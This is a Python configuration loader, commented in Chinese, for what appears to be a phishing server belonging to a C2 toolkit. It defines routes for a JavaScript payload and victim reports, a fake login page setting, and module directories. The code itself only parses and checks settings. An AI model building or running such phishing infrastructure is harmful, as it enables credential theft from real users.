"""PhishingServer 配置加载 — 与 c2_server/core/config.py 同风格。

config.json 缺失字段用默认值;端口/路由等做基础校验。
相对路径(modules_dir/pages_dir)基于项目根解析。
"""

import json
import os
from dataclasses import dataclass, field
from typing import Any, Dict


@dataclass
class PhishingConfig:
    host: str = "0.0.0.0"
    port: int = 9100
    route_payload: str = "/payload.js"
    route_report: str = "/report"
    default_module: str = "hello"
    active_page: str = "login"
    modules_dir: str = "js_modules"
    pages_dir: str = "pages"
    report_max: int = 500
    max_payload_bytes: int = 262144
    base_dir: str = ""            # 配置文件所在目录(路径解析基准)
    config_path: str = ""         # 配置文件绝对路径(写回用)

    def resolve_path(self, p: str) -> str:
        if not p:
            return ""
        if os.path.isabs(p):
            return p
        return os.path.join(self.base_dir or ".", p)

    def validate(self) -> list:
        problems = []
        if not (1 <= self.port <= 65535):
            problems.append(f"port 必须在 1-65535: {self.port}")
        if not self.route_payload.startswith("/"):
            problems.append(f"route_payload 必须以 / 开头: {self.route_payload!r}")
        if not self.route_report.startswith("/"):
            problems.append(f"route_report 必须以 / 开头: {self.route_report!r}")
        if self.report_max <= 0:
            problems.append(f"report_max 必须 > 0: {self.report_max}")
        if self.max_payload_bytes <= 0:
            problems.append(f"max_payload_bytes 必须 > 0: {self.max_payload_bytes}")
        return problems


# 配置字段白名单(POST 修改只允许这些字段)
_CONFIG_FIELDS = (
    "host", "port", "route_payload", "route_report",
    "default_module", "active_page", "report_max", "max_payload_bytes",
)


def load_config(path: str) -> PhishingConfig:
    """从 JSON 文件加载配置,缺失字段回默认值。

    显式字段(与默认值不同)覆盖;base_dir/config_path 由本函数填充。
    """
    cfg = PhishingConfig()
    base_dir = os.path.dirname(os.path.abspath(path))
    cfg.base_dir = base_dir
    cfg.config_path = os.path.abspath(path)
    try:
        with open(path, "r", encoding="utf-8") as f:
            raw = json.load(f)
    except (OSError, json.JSONDecodeError):
        raw = {}
    if not isinstance(raw, dict):
        raw = {}
    for k in _CONFIG_FIELDS:
        if k in raw and raw[k] is not None:
            try:
                if k in ("port", "report_max", "max_payload_bytes"):
                    setattr(cfg, k, int(raw[k]))
                else:
                    setattr(cfg, k, str(raw[k]))
            except (TypeError, ValueError):
                pass
    return cfg


def save_config(path: str, cfg: PhishingConfig, updates: Dict[str, Any]) -> tuple:
    """按白名单字段更新配置并写回磁盘。返回 (ok, changed_fields)。"""
    allowed = {"host", "port", "route_payload", "route_report",
               "default_module", "active_page", "report_max", "max_payload_bytes"}
    changed = []
    try:
        with open(path, "r", encoding="utf-8") as f:
            raw = json.load(f)
    except (OSError, json.JSONDecodeError):
        raw = {}
    if not isinstance(raw, dict):
        raw = {}
    for k, v in (updates or {}).items():
        if k not in allowed:
            continue
        try:
            if k in ("port", "report_max", "max_payload_bytes"):
                v = int(v)
                if k == "port" and not (1 <= v <= 65535):
                    continue
            else:
                v = str(v or "").strip()
                if not v:
                    continue
        except (TypeError, ValueError):
            continue
        if raw.get(k) != v:
            raw[k] = v
            changed.append(k)
    if not changed:
        return True, []
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(raw, f, indent=2, ensure_ascii=False)
    except OSError:
        return False, []
    return True, changed
